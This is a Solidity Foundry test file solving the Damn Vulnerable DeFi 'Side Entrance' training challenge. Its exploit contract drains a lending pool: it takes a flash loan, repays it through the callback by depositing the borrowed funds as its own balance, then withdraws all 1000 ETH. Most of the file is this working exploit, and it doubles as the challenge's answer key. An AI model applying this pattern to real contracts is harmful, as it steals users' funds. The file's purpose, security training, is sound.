// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceExploitReal {
	ISideEntranceLenderPool public immutable pool;
	address public immutable owner;
	address public immutable recoveryAddress; 

	modifier onlyOwner() {
		require(msg.sender == owner, "No authorized");
		_;
	}

	constructor(address _pool, address _recoveryAddress) {
		pool = ISideEntranceLenderPool(_pool);
		owner = msg.sender;
		recoveryAddress = _recoveryAddress;
	}

	function attack(uint256 amount) external onlyOwner {
		pool.flashLoan(amount);
		pool.withdraw();

		uint256 balance = address(this).balance;
		(bool success, ) = recoveryAddress.call{value: balance}("");
		require(success, "Transfer to recovery failed");
	}

	function execute() external payable {
		require(msg.sender == address(pool), "only pool");
		pool.deposit{value: msg.value}();
	}

	receive() external payable {}
}



contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
	   SideEntranceExploitReal exploit = new SideEntranceExploitReal(
	   	   address(pool),
	   	   recovery		
	   );
	   
	   exploit.attack(ETHER_IN_POOL);	         
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
